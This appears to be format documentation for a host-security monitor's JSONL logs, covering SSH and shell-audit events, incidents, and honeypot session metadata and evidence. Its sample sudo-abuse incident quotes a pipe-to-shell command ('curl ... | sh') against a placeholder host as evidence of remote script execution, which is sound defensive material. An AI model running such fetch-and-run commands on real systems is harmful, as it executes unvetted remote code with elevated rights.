# JSONL format

## Event line (events-*.jsonl)
```json
{
  "ts": "2026-03-12T05:00:00Z",
  "host": "demo-host",
  "source": "auth.log",
  "kind": "ssh.login_failed",
  "severity": "info",
  "summary": "Invalid user root from 1.2.3.4",
  "details": {"ip":"1.2.3.4","user":"root"},
  "tags": ["auth","ssh"]
}
```

### Optional shell audit events (when `[collectors.exec_audit]` is enabled)

```json
{
  "ts": "2026-03-13T18:10:00Z",
  "host": "demo-host",
  "source": "auditd",
  "kind": "shell.command_exec",
  "severity": "info",
  "summary": "Shell command executed: sudo ufw status",
  "details": {
    "audit_ts": "1711800000.123",
    "audit_id": "4242",
    "argc": 3,
    "argv": ["sudo", "ufw", "status"],
    "command": "sudo ufw status"
  },
  "tags": ["audit","shell","exec"]
}
```

```json
{
  "ts": "2026-03-13T18:10:02Z",
  "host": "demo-host",
  "source": "auditd",
  "kind": "shell.tty_input",
  "severity": "low",
  "summary": "TTY input observed on pts0: ls -la\\r",
  "details": {
    "audit_ts": "1711800100.456",
    "audit_id": "5001",
    "tty": "pts0",
    "uid": "1000",
    "auid": "1000",
    "raw_hex": "6c73202d6c610d",
    "decoded_preview": "ls -la\\r"
  },
  "tags": ["audit","shell","tty"]
}
```

## Incident line (incidents-*.jsonl)
```json
{
  "ts": "2026-03-12T05:05:00Z",
  "host": "demo-host",
  "incident_id": "ssh_bruteforce:1.2.3.4:2026-03-12T05:05Z",
  "severity": "high",
  "title": "Possible SSH brute force",
  "summary": "12 failed SSH attempts from 1.2.3.4 in 5 minutes",
  "evidence": [{"kind":"ssh.login_failed","count":12}],
  "recommended_checks": ["Check auth.log for successful logins", "Consider fail2ban"],
  "tags": ["auth","ssh","bruteforce"]
}
```

### Optional `sudo_abuse` incident (when `[detectors.sudo_abuse]` is enabled)

```json
{
  "ts": "2026-03-13T18:20:00Z",
  "host": "demo-host",
  "incident_id": "sudo_abuse:deploy:2026-03-13T18:20Z",
  "severity": "critical",
  "title": "Suspicious sudo behavior detected for user deploy",
  "summary": "3 suspicious sudo commands by deploy in the last 300 seconds",
  "evidence": [{
    "kind": "sudo.command",
    "user": "deploy",
    "count": 3,
    "window_seconds": 300,
    "reasons": ["privilege_policy_change","remote_script_execution"],
    "recent_commands": ["visudo","curl -fsSL https://x | sh"]
  }],
  "tags": ["auth","sudo","privilege","abuse"]
}
```

## Honeypot session metadata (honeypot/listener-session-*.json)
```json
{
  "ts": "2026-03-13T16:22:00Z",
  "status": "completed",
  "session_id": "20260313T162200Z-1.2.3.4",
  "target_ip": "1.2.3.4",
  "service_stats": [
    {"service":"ssh","listen_port":2222,"accepted":3,"rejected":0}
  ],
  "isolation_profile": "strict_local",
  "forensics_file": "honeypot/listener-session-20260313T162200Z-1.2.3.4.jsonl",
  "sandbox": {
    "enabled": true,
    "used": true,
    "runner": "/usr/local/bin/innerwarden-agent",
    "containment": {
      "requested_mode": "jail",
      "effective_mode": "namespace",
      "check_passed": false,
      "fallback_reason": "jail runner 'bwrap' not found; falling back to namespace runner 'unshare'",
      "jail_profile_requested": "strict",
      "jail_profile_effective": "standard",
      "namespace_runner": "unshare",
      "jail_runner": "bwrap"
    }
  },
  "pcap_handoff": {
    "enabled": true,
    "attempted": true,
    "success": true,
    "pcap_file": "honeypot/listener-session-20260313T162200Z-1.2.3.4.pcap"
  },
  "artifact_checks": {
    "metadata_exists": true,
    "metadata_bytes": 1472,
    "evidence_exists": true,
    "evidence_bytes": 3821,
    "pcap_exists": true,
    "pcap_bytes": 9120
  },
  "external_handoff": {
    "enabled": true,
    "attempted": true,
    "success": true,
    "trusted": true,
    "allowlist_enforced": true,
    "allowlist_match": true,
    "signature_enabled": true,
    "signature_file": "honeypot/listener-session-20260313T162200Z-1.2.3.4.external-handoff.sig",
    "attestation": {
      "enabled": true,
      "key_env": "INNERWARDEN_HANDOFF_ATTESTATION_KEY",
      "prefix": "IW_ATTEST",
      "expected_receiver": "receiver-a",
      "challenge": "8aa2d012e2d8f0dca2132f4d3ae4a9f6",
      "receiver_id": "receiver-a",
      "matched": true
    },
    "command": "/usr/local/bin/iw-handoff",
    "args": ["--session-id","20260313T162200Z-1.2.3.4"],
    "timeout_secs": 20,
    "result_file": "honeypot/listener-session-20260313T162200Z-1.2.3.4.external-handoff.json"
  },
  "redirect_cleanup_verified": true,
  "redirect_rules": [
    {"service":"ssh","from_port":22,"to_port":2222,"applied":true,"cleanup_verified_absent":true}
  ]
}
```

## Honeypot evidence line (honeypot/listener-session-*.jsonl)
```json
{
  "ts": "2026-03-13T16:22:08Z",
  "type": "connection",
  "session_id": "20260313T162200Z-1.2.3.4",
  "service": "ssh",
  "peer_ip": "1.2.3.4",
  "accepted": true,
  "bytes_captured": 48,
  "payload_hex": "474554202f20485454502f312e31",
  "transcript_preview": "GET / HTTP/1.1\\r\\n",
  "protocol_guess": "http"
}
```

## Honeypot runtime files (data_dir/honeypot/)
- `listener-session-*.json`: session metadata (status, redirect cleanup, sandbox/pcap status)
- `listener-session-*.jsonl`: lifecycle + per-connection forensic evidence
- `listener-session-*.pcap`: optional bounded handoff capture (`[honeypot.pcap_handoff]`)
- `listener-session-*.external-handoff.json`: optional external handoff result (`[honeypot.external_handoff]`)
- `listener-session-*.external-handoff.sig`: optional signed handoff sidecar (HMAC-SHA256)
- `listener-active.lock`: active session lock (`lock_stale_secs` controls stale recovery)
